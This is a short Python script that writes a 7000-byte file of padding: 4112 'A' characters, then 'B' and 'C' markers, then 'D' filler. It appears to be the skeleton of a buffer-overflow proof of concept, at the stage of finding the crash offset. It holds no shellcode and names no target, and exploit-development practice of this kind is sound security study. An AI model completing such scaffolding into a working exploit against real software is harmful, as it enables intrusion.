#!/usr/bin/python

import struct

filename = 'test.txt'

payload  = "A" * 4112
payload += "B" * 4
payload += "C" * 4
payload += "D" * (7000 - len(payload))

print "[+] Creating file %s" % filename
with open(filename, 'w') as f:
    f.write(payload)
print "    File created, wrote %d bytes to file" % len(payload)

